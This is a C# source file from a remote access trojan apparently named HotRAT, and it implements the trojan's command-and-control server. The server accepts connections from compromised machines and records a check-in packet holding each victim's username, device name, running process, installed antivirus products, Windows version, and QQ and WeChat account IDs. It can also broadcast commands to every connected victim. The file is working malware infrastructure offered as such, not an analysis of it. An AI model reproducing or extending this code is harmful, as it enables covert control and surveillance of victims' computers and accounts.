using HotRAT.WSServer.Models;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
namespace HotRAT.Server.Models
{
    public class ClientInfo
    {
        public string IP { get; set; }
        public int Port { get; set; }
        public string UserName { get; set; }
        public string DeviceName { get; set; }
        public string ProcessName { get; set; }
        public int PID { get; set; }
        public string[] AntivirusName { get; set; }
        public DateTime ConnectTime { get; set; }
        public string WindowsVersion { get; set; }
        public string[] QQNumber { get; set; }
        public string[] WXID { get; set; }
    }

    public class ClientConnection : IDisposable
    {
        private const int HeaderSize = sizeof(int) + sizeof(byte);
        private readonly NetworkStream _stream;
        private readonly byte[] _receiveBuffer = new byte[8192];
        private readonly MemoryStream _packetBuffer = new MemoryStream();

        public Guid ConnectionId { get; } = Guid.NewGuid();
        public TcpClient TcpClient { get; }
        public ClientInfo Info { get; set; } = new ClientInfo();

        public ClientConnection(TcpClient client)
        {
            TcpClient = client;
            _stream = client.GetStream();
            Info.ConnectTime = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow,TimeZoneInfo.FindSystemTimeZoneById("China Standard Time"));
            Info.IP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
            Info.Port = ((IPEndPoint)client.Client.RemoteEndPoint).Port;
            LoggerModel.AddToLog($"[{Info.IP}:{Info.Port}]已连接", InfoLevel.Normal);
        }

        public async Task StartReceivingAsync()
        {
            try
            {
                while (TcpClient.Connected)
                {
                    var bytesRead = await _stream.ReadAsync(_receiveBuffer, 0, _receiveBuffer.Length);
                    if (bytesRead == 0) break;

                    await ProcessReceivedData(_receiveBuffer, bytesRead);
                }
            }
            finally
            {
                Dispose();
            }
        }

        private async Task ProcessReceivedData(byte[] buffer, int bytesRead)
        {
            await _packetBuffer.WriteAsync(buffer, 0, bytesRead);
            _packetBuffer.Position = 0;

            while (_packetBuffer.Length - _packetBuffer.Position >= HeaderSize)
            {
                var packetSizeBuffer = new byte[sizeof(int)];
                await _packetBuffer.ReadAsync(packetSizeBuffer, 0, sizeof(int));
                int packetSize = BitConverter.ToInt32(packetSizeBuffer, 0);

                var packetTypeBuffer = new byte[sizeof(byte)];
                await _packetBuffer.ReadAsync(packetTypeBuffer, 0, sizeof(byte));
                byte packetType = packetTypeBuffer[0];

                if (_packetBuffer.Length - _packetBuffer.Position >= packetSize)
                {
                    var packetData = new byte[packetSize];
                    await _packetBuffer.ReadAsync(packetData, 0, packetSize);
                    ProcessPacket(packetType, packetData);
                }
                else
                {
                    _packetBuffer.Position -= HeaderSize;
                    break;
                }
            }

            byte[] tempBuffer = _packetBuffer.ToArray();
            int remainingLength = tempBuffer.Length - (int)_packetBuffer.Position;
            byte[] remainingData = new byte[remainingLength];
            Array.Copy(tempBuffer, _packetBuffer.Position, remainingData, 0, remainingLength);

            _packetBuffer.SetLength(0);
            await _packetBuffer.WriteAsync(remainingData, 0, remainingData.Length);
        }

        private void ProcessPacket(byte packetType, byte[] data)
        {
            using var ms = new MemoryStream(data);
            using var reader = new BinaryReader(ms, Encoding.UTF8);

            switch (packetType)
            {
                case 0x01:
                    Info.UserName = reader.ReadString();
                    Info.DeviceName = reader.ReadString();
                    Info.ProcessName = reader.ReadString();
                    Info.PID = reader.ReadInt32();
                    Info.AntivirusName = reader.ReadString().Split("|");
                    Info.WindowsVersion = reader.ReadString();
                    Info.QQNumber = reader.ReadString().Split("|");
                    Info.WXID = reader.ReadString().Split("|");
                    LoggerModel.AddToLog($"[{Info.IP}:{Info.Port}][{Info.DeviceName}]上线包已接收", InfoLevel.Normal);
                    Console.WriteLine(JsonConvert.SerializeObject(Info,Formatting.Indented));

                    //通知所有ws
                    WebSocketServer.UpdataAllClients();
                    break;
                case 0x02:
                    var datas = Encoding.UTF8.GetString(data).Split("\\n");
                    if (datas.Length >= 3)
                    {
                        var flag = datas[0];
                        var model = datas[1];
                        var result = datas[2];
                        Console.WriteLine($"{flag} {model} {result}");
                    }
                    else
                    {
                        Console.Error.WriteLine("数据包不合法");
                    }
                    break;
            }
        }

        public async Task SendAsync(byte[] data, byte packetType = 0x02)
        {
            var header = BitConverter.GetBytes(data.Length);
            var typeByte = new[] { packetType };

            using var ms = new MemoryStream(header.Length + typeByte.Length + data.Length);
            await ms.WriteAsync(header, 0, header.Length);
            await ms.WriteAsync(typeByte, 0, typeByte.Length);
            await ms.WriteAsync(data, 0, data.Length);

            await _stream.WriteAsync(ms.ToArray(), 0, (int)ms.Length);
        }

        public void Dispose()
        {
            try
            {
                foreach (var client in Runtimes._clients)
                {
                    if(client.Key == ConnectionId)
                    {
                        Runtimes._clients.TryRemove(ConnectionId,out _);
                    }
                }
                _stream?.Dispose();
                TcpClient?.Dispose();
                _packetBuffer?.Dispose();

                Runtimes.CWrite($"[{Info.IP}:{Info.Port}][{ConnectionId}] 下线", ConsoleColor.Red);

                WebSocketServer.UpdataAllClients();
            }
            catch (Exception ex)
            {
                Runtimes.CWrite($"Dispose 错误: {ex.Message}", ConsoleColor.Red);
            }
        }
    }

    public class SocketServer : IDisposable
    {
        private readonly TcpListener _listener;

        public SocketServer(int port)
        {
            _listener = new TcpListener(IPAddress.Any, port);
        }

        public async Task StartAsync()
        {
            _listener.Start();
            while (true)
            {
                var client = await _listener.AcceptTcpClientAsync();
                var connection = new ClientConnection(client);
                Runtimes._clients.TryAdd(connection.ConnectionId, connection);
                _ = connection.StartReceivingAsync();
            }
        }

        public void Broadcast(byte[] data)
        {
            foreach (var client in Runtimes._clients.Values)
            {
                if (client.TcpClient.Connected)
                    _ = client.SendAsync(data);
            }
        }

        public void Dispose()
        {
            _listener.Stop();
            foreach (var client in Runtimes._clients.Values)
                client.Dispose();
        }
    }
}
